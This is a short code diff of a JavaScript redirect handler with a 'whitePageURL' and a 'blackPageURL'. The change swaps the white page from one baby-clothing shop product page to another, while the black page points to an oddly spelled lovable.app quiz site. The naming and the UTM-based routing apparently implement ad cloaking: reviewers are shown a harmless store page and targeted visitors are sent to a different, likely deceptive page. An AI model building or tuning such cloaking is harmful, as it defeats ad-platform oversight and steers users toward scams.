@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyshop.de/Meal-Time/Food-Storage/Liewood-Carin-Lunchbox-Whale-blue-Sea-blue::57729.html";
+    const whitePageURL = "https://bachaaparty.com/collections/baby-boy-suits-sets/products/infant-boys-cotton-interlock-suit-york-yelow";
     const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
